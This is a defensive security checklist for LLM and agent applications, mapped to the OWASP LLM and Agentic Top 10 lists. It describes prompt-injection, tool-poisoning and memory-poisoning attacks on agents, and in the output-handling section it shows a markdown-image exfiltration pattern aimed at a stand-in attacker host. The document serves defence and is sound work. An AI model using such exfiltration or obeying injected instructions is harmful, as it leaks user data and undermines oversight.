# AI, LLM & Agentic Security Checklist

**Mapped to [OWASP Top 10 for LLM Applications (2025)](https://genai.owasp.org/llm-top-10/) and [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/).**

The central assumption of this checklist:

> **You cannot make the model trustworthy. You can make its blast radius small.**

Every effective control below is a variation on that sentence. Prompt injection has no complete fix — there is no parser that separates instructions from data, because to an LLM they are the same tokens. So the security work is not "stop the injection". It is: assume the injection succeeds, and make sure the successful injection cannot reach anything that matters.

If you take one thing from this file, take this: **a chatbot that gets jailbroken writes an embarrassing sentence. An agent that gets jailbroken has your credentials, your tools, and a loop.** Those are different risk classes and they deserve different budgets.

---

## 0. Before you build

- [ ] It is written down **what the system is allowed to do**, in terms of side effects, not features
- [ ] The **trust boundary** is explicit: where does untrusted text enter, and what does it reach?
- [ ] Every data source the model reads is classified as trusted or untrusted — **web pages, PDFs, emails, tickets, code comments, and search results are all untrusted input**
- [ ] The system is threat-modelled against LLM01–LLM10 and, if it is agentic, ASI01–ASI10
- [ ] "What is the worst thing this system can do to a user, to the company, and to itself?" has a written answer
- [ ] Non-AI alternatives were considered for high-risk steps — a deterministic rule beats a probabilistic one where correctness is required
- [ ] The model is **not** the security control: authorisation is enforced in code, before and after the model, never by asking the model nicely

> A system prompt saying "never reveal customer data" is not access control. It is a suggestion to a component that is definitionally suggestible.

---

## 1. Prompt injection — direct and indirect (LLM01, ASI01)

*Direct: the user types the attack. Indirect: the attack is in a document the model reads. Indirect is the dangerous one, because no human is present to look suspicious.*

- [ ] Untrusted content is **delimited and labelled** as data on the way into the context, not concatenated into the instruction block
- [ ] The system prompt does not rely on being secret (assume it leaks — see §7)
- [ ] Content fetched at runtime (RAG chunks, tool results, web pages, sub-agent output) is treated as **untrusted input**, not as instruction
- [ ] Rendered content is stripped of hidden text: zero-width and Unicode tag characters, white-on-white text, HTML comments, `alt` text, metadata fields
- [ ] Injection is tested for continuously, not once — an automated suite runs on every prompt or model change ([garak](https://github.com/NVIDIA/garak), [PyRIT](https://github.com/Azure/PyRIT), [promptfoo](https://github.com/promptfoo/promptfoo))
- [ ] Input and output guardrails exist, **and are documented as defence in depth rather than a boundary** — every guardrail has a published bypass
- [ ] The consequences of a successful injection have been enumerated per tool, and each one is either acceptable or blocked by a control outside the model

> Test for this the way you test a WAF: assume it will be bypassed, and check what is behind it.

## 2. Output handling (LLM05)

*The model's output is user-controlled input to whatever consumes it. Every classic injection class comes back here.*

- [ ] Model output rendered in a browser is **escaped or sanitised** — an LLM will happily emit `<script>` or a `javascript:` URL
- [ ] Model output is never passed to `eval`, `exec`, a shell, or a template engine in an unsandboxed context (ASI05)
- [ ] Generated SQL/queries are parameterised or executed against a read-only, row-scoped connection — never string-concatenated
- [ ] Generated URLs are validated against an allowlist before being fetched or rendered — **markdown image rendering is a data exfiltration channel** (`![](https://attacker/?data=...)`)
- [ ] Generated code that is executed runs in a sandbox with no network, no credentials, and a hard timeout
- [ ] Output size and content type are validated before downstream consumption
- [ ] File paths derived from model output are canonicalised and confined to a jail directory

## 3. Agency, tools and permissions (LLM06, ASI02, ASI03)

*Excessive agency is where most real agent incidents actually live. The injection is the trigger; the over-scoped tool is the vulnerability.*

- [ ] Every tool the agent can call is **inventoried**, with its side effects written out in plain language
- [ ] Tools are scoped to the **minimum operation**, not the minimum service — `get_customer_by_id` rather than `run_sql`
- [ ] Read and write are separate tools with separate authorisation
- [ ] The agent acts with the **user's** identity and permissions, not a shared service identity with the union of everyone's access (this is the confused-deputy pattern)
- [ ] Authorisation is re-checked **at the tool boundary**, on every call, server-side — not decided once at session start
- [ ] Irreversible or high-value actions (payment, deletion, email to external parties, production deploy, IAM change) require **explicit human approval showing the actual parameters**
- [ ] Rate limits and spend limits are enforced per session and per identity, not just globally
- [ ] Tool credentials are short-lived and scoped per invocation — not a long-lived key in the agent's environment (see [secrets-management.md](secrets-management.md))
- [ ] There is a **kill switch** that revokes the agent's credentials, and someone has tested it

> The question to ask about any agent is not "can it be jailbroken?" — it can. It is "when it is, what is the worst API call it can make?"

## 4. Memory, planning and multi-agent systems (ASI01, ASI06, ASI07, ASI08, ASI10)

- [ ] Persistent memory is **scoped per user and per tenant**, and written memories are treated as untrusted on read-back
- [ ] What can be written to long-term memory is constrained — an injected instruction stored in memory is a **persistent backdoor that survives the session**
- [ ] Memory is inspectable and clearable by the user, and expires by default
- [ ] Plans and goals are validated against the original task before execution — goal drift is detectable
- [ ] Inter-agent messages are authenticated; one agent's output is untrusted input to the next (ASI07)
- [ ] There are hard limits on loop iterations, recursion depth, sub-agent spawning, and total tool calls per task
- [ ] Failure of one agent cannot silently cascade — timeouts, circuit breakers, and a defined degraded mode (ASI08)
- [ ] Every agent identity is registered and attributable; there is a process to detect an agent running that nobody authorised (ASI10)
- [ ] Agent-to-agent trust is not transitive by default

## 5. MCP and the tool supply chain (LLM03, ASI04)

*MCP servers are dependencies with your credentials and a natural-language interface. Treat them exactly as seriously as an npm package that runs at install time — because that is what they are.*

- [ ] MCP servers come from a **vetted, pinned source** — pinned by digest or commit, not by a floating tag
- [ ] Server code is reviewed before it is trusted with credentials; publisher identity is verified (typosquatted and name-colliding servers are an established attack)
- [ ] **Tool descriptions are treated as untrusted input** — they enter the model's context and can carry instructions (tool poisoning)
- [ ] Tool definitions are pinned and **re-verified on change** — a server that silently mutates a tool description after approval is a rug-pull
- [ ] Each server gets its own narrowly scoped credential, never a shared or admin token
- [ ] Servers are network-isolated by default; egress is allowlisted
- [ ] Users see the **actual tool call and parameters** before approval, not a model-written summary of them — approval-view fidelity is a real gap
- [ ] Servers run with least privilege on the host: no `--privileged`, no host mount of `/`, no docker socket
- [ ] An inventory exists of which MCP servers are installed, by whom, on which developer machines and in which CI systems
- [ ] Prompts, tools, and resources served by third parties are versioned and diffed, like any other dependency

## 6. RAG, vector stores and data (LLM02, LLM08)

- [ ] **The vector store inherits the access control of its worst-protected source document.** Document-level permissions are enforced at retrieval time, not filtered after generation
- [ ] Tenant isolation is enforced by the query itself (separate collections or a mandatory tenant filter applied server-side), never by a filter the model can choose to omit
- [ ] Ingestion sanitises documents for embedded instructions and hidden characters
- [ ] Sensitive data is redacted or excluded **before** embedding — embeddings are not a security boundary and are partially invertible
- [ ] Re-indexing runs when source permissions change, and deletions propagate
- [ ] PII/secrets are filtered on both the request and the response path
- [ ] Training, fine-tuning, and evaluation data are inventoried, with provenance and licensing recorded
- [ ] User data does not enter training or fine-tuning without an explicit, documented legal basis
- [ ] Logs, traces, and prompt-capture tooling are treated as sensitive stores — full prompts frequently contain credentials and customer data

## 7. Model and system prompt (LLM04, LLM07)

- [ ] Models are pulled from verified sources, pinned by digest or revision, and mirrored internally
- [ ] Model artifacts are **scanned before loading** ([ModelScan](https://github.com/protectai/modelscan), [picklescan](https://github.com/mmaitre314/picklescan)) — never `torch.load` an untrusted pickle
- [ ] `safetensors` is preferred over pickle-based formats
- [ ] An **AI-BOM / ML-BOM** records models, datasets, adapters, and their versions (CycloneDX supports this)
- [ ] Fine-tuning and RLHF data pipelines have integrity controls — poisoning is cheapest at the data stage
- [ ] The system prompt contains **no secrets, no API keys, no internal hostnames, and no authorisation logic** — assume it is public
- [ ] Model, prompt, and tool-schema versions are pinned and rolled out deliberately; a silent provider-side model change is a production change
- [ ] There is a rollback path for a bad prompt or model version

## 8. Resource use and cost (LLM10)

- [ ] Per-user and per-key rate limits, token limits, and context-length limits are enforced
- [ ] Spend alerting and a hard budget cap exist — **denial of wallet is the most common real-world AI incident**
- [ ] Timeouts and maximum step counts bound every agent run
- [ ] Expensive tools (search, code execution, large-context calls) are separately budgeted
- [ ] Model-extraction patterns (high-volume systematic querying) are monitored for

## 9. Observability, evaluation and response

- [ ] Every prompt, tool call, tool result, and approval decision is **logged with a trace ID and the acting identity**
- [ ] Logs are retained per policy and access-controlled — they contain everything sensitive the system has ever seen
- [ ] Security evaluations run in CI on prompt, model, tool, and RAG-config changes, and a regression fails the build
- [ ] Red teaming is scheduled and repeated, not a one-off launch activity ([MITRE ATLAS](https://atlas.mitre.org/) for technique coverage)
- [ ] Incident response covers AI-specific cases: prompt injection with tool abuse, memory poisoning, a compromised MCP server, model provider compromise (see [incident-response.md](incident-response.md))
- [ ] Users can report bad or harmful output, and reports reach someone
- [ ] The bug bounty / vulnerability disclosure scope explicitly states whether AI-specific findings are in scope

## 10. Human oversight (ASI09)

- [ ] Approval prompts show **what will happen**, in specific terms, with the real parameters — not "the assistant would like to continue"
- [ ] Approval fatigue is designed against: rare, meaningful prompts beat constant ones that get click-through approved
- [ ] Model confidence is not presented as accuracy, and output that could be acted on medically, legally, or financially is labelled (LLM09)
- [ ] It is always clear to the user that they are talking to an AI system
- [ ] There is a documented path to reach a human
- [ ] Automation bias is acknowledged in the design: a reviewer approving 200 agent actions a day is not meaningfully reviewing them

## 11. Governance and compliance

- [ ] An AI system inventory exists — including **shadow AI**: assistants, plugins, and agents adopted without review
- [ ] Risk classification is done against the [EU AI Act](https://artificialintelligenceact.eu/) if you have EU users. GPAI obligations have applied since **2 Aug 2025**, and the Commission's supervision and enforcement powers commenced **2 Aug 2026**; the Annex III high-risk deadline was deferred to **2 Dec 2027** by the Digital Omnibus agreement — track it, the dates have moved before
- [ ] [NIST AI RMF 1.0](https://www.nist.gov/itl/ai-risk-management-framework) functions (Govern, Map, Measure, Manage) are mapped to owners
- [ ] [NIST SP 800-218A](https://csrc.nist.gov/pubs/sp/800/218/a/final) — SSDF practices extended for generative AI — is reflected in the SDLC
- [ ] [ISO/IEC 42001](https://www.iso.org/standard/42001) is assessed if certification is a customer requirement
- [ ] Data residency, retention, and sub-processor terms with model providers are reviewed and recorded
- [ ] Model and prompt changes go through change management with an audit trail

## 12. Securing your SDLC *against* AI tooling

*The other half of the problem, and the half most teams skip: you are now shipping code written by a statistical model and running agents with repository write access.*

- [ ] AI-generated code goes through the same review, SAST, and SCA as human code — it reproduces training-set vulnerability patterns, confidently
- [ ] **Dependency hallucination / slopsquatting**: every package an assistant suggests is verified to exist and be the intended one before it is added
- [ ] Assistant and agent configuration files in the repo (`*.md` instruction files, tool configs, IDE rules) are **code-reviewed and CODEOWNER-protected** — they are executable instructions to an agent
- [ ] Agents with repository or CI write access are treated as privileged identities: named, scoped, logged, revocable, and excluded from approving their own changes
- [ ] Agents cannot approve pull requests, and their commits are distinguishable
- [ ] CI jobs that invoke an LLM cannot reach secrets that the LLM's output could exfiltrate
- [ ] Source code sent to third-party assistants is covered by a reviewed retention and training policy
- [ ] Autonomous agents run in isolated environments (throwaway containers, scoped tokens, no production credentials)

---

## Mapping

| OWASP LLM Top 10 (2025) | Covered in |
|---|---|
| LLM01 Prompt Injection | §1 |
| LLM02 Sensitive Information Disclosure | §6, §9 |
| LLM03 Supply Chain | §5, §7 |
| LLM04 Data & Model Poisoning | §7 |
| LLM05 Improper Output Handling | §2 |
| LLM06 Excessive Agency | §3 |
| LLM07 System Prompt Leakage | §7 |
| LLM08 Vector & Embedding Weaknesses | §6 |
| LLM09 Misinformation | §10 |
| LLM10 Unbounded Consumption | §8 |

| OWASP Agentic Top 10 (2026) | Covered in |
|---|---|
| ASI01 Agent Goal Hijack | §1, §4 |
| ASI02 Tool Misuse & Exploitation | §3 |
| ASI03 Identity & Privilege Abuse | §3 |
| ASI04 Agentic Supply Chain | §5 |
| ASI05 Unexpected Code Execution | §2 |
| ASI06 Memory & Context Poisoning | §4 |
| ASI07 Insecure Inter-Agent Communication | §4 |
| ASI08 Cascading Failures | §4 |
| ASI09 Human-Agent Trust Exploitation | §10 |
| ASI10 Rogue Agents | §4 |

---

## The three questions worth asking in a design review

1. **What untrusted text reaches the model?** Trace it back to the source. There is almost always more than the team expects — tool output, retrieved documents, and other agents all count.
2. **What can the model cause to happen?** Not what it is *supposed* to do. List the tools and their real side effects.
3. **Which of those effects would we be unable to undo?** Those are the ones that need a control that is not the model.

If §1 and §2 intersect anywhere in §3, that is your finding. Everything else on this page is detail.

---

## Where this fits

- Section 21 of the [roadmap](../README.md#21-ai--llm-security) has the learning resources
- [P13 in the projects list](../projects/README.md) is the portfolio project that exercises this checklist
- Lab 5.4 in the [labs](../labs/README.md) is the hands-on version
- Agent identities and credentials: [secrets-management.md](secrets-management.md)
- Model and MCP dependencies: [supply-chain-security.md](supply-chain-security.md)
